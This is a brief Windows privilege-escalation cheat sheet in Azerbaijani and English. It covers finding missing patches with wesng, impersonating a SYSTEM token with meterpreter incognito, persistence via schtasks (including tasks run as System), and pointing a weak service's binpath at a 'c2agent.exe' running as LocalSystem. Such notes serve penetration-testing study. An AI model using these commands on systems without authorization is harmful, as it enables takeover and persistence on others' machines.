# Windows System Analysis

İlk öncə sistem haqda məlumat almaq lazımdı cmd-də `systeminfo` yazaraq çıxan məlumatları bir fayla yazıb saxlamaq lazımdı. Daha sonra bu faylı `wesng` tooluna veririk
sistemdə mümkün olan bütün açıqlıqları detallıca gətirir və bizə təkcə bunu analiz etmək hansının işə yarayıb hansının yaramadığını yoxlamaq lazımdır.

#### Privilege Escalation

İlk öncə `getuid`[meterpreter] ilə sistemə girdiyimiz userin imtiyazlarını görə bilərik. Ən yüksək imtiyaz `NT_AUTHORİTY\SYSTEM`-dir.  
`getprivs`[meterpreter] ( `whoami /priv`[cmd] ) ilə userin sistemdə edə biləcəyi işləri görə bilərik.

`load incognito`[meterpreter] əlavələri hədəfə yükləyəcək və `load`[meterpreter] yazdıqda işlədə biləcək əlavələrin listi çıxacaq.
`list_tokens -u`[meterpreter] ilə daha yüksək imtiyazlı istifadəçiləri token ilə təqlid edə bilib bilməyəcəyini göstərir.
Əgər belə bir imtiyaz olarsa onda `impersonate_token "NT_AUTHORİTY\SYSTEM"` yazaraq o imtiyaza sahib olacaq.


## cmd commands

You can get a list of scheduled tasks with the following command:  
`schtasks /query /fo LIST /v`

To schedule a task that runs every time the system starts:  
`schtasks /create /tn <TaskName> /tr <TaskRun> /sc onstart` 

To schedule a task that runs when users log on:  
`schtasks /create /tn <TaskName> /tr <TaskRun> /sc onlogon` 

To schedule a task that runs when the system is idle:  
`schtasks /create /tn <TaskName> /tr <TaskRun> /sc onidle /i {1 - 999}`

To schedule a task that runs once:  
`schtasks /create /tn <TaskName> /tr <TaskRun> /sc once /st <HH:MM>`

To schedule a task that runs with system permissions:  
`schtasks /create /tn <TaskName> /tr <TaskRun> /sc onlogon /ru System`

To schedule a task that runs on a remote computer:  
`schtasks /create /tn <TaskName> /tr <TaskRun> /sc onlogon /s <PC_Name>`

List the services running on the host:  
`net start` 

To get the parameters for an individual server:
`sc qc VulnService`

Services can be queried individually or in a batch to determine their access control rules:
`accesschk.exe -ucqv VulnService`

Any logged-in user can modify parameters for the VulnService service. To achieve this:  
`sc config VulnPath binpath="C:\temp\c2agent.exe"`  
`sc config VulnPath obj= ".\LocalSystem" password= ""`  
